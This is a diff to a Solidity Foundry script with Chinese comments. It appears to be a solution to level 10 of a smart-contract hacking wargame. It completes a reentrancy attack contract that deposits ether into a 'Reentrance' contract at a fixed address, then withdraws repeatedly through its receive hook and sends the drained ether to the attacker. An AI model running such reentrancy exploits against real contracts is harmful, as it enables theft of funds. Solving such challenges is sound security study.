@@ -15,7 +15,8 @@ import "forge-std/console.sol";
 // 重複執行直到合約的餘額小於 0
 
 contract attackCon {
-    Reentrance public lev10Instance = Reentrance(payable());
+    Reentrance public lev10Instance =
+        Reentrance(payable(0x932D2138869Ad1Cb1231F7131A3E7BBd31be49e4));
     constructor() public payable {
         // 初始化
         // 往合約打入 0.001 eth
@@ -24,7 +25,8 @@ contract attackCon {
     function withdraw() external {
         // 提取我打入的資金
         lev10Instance.withdraw(0.001 ether);
-        (bool result) = msg.sender.call{value: 0,002 ether}("");
+        // 把合約中的 eth 打入自己的地址
+        (bool result, ) = msg.sender.call{value: 0.002 ether}("");
     }
     receive() external payable {
         // 再次從合約提取資金
@@ -37,7 +39,9 @@ contract Lev10Sol is Script {
 
     function run() external {
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
+        // 往 attackCon 打 0.001 eth, 讓攻擊合約有資金準備攻擊
         attackCon attackConwhy = new attackCon{value: 0.001 ether}();
+        // 開始執行有漏洞的 function
         attackConwhy.withdraw();
         vm.stopBroadcast();
     }
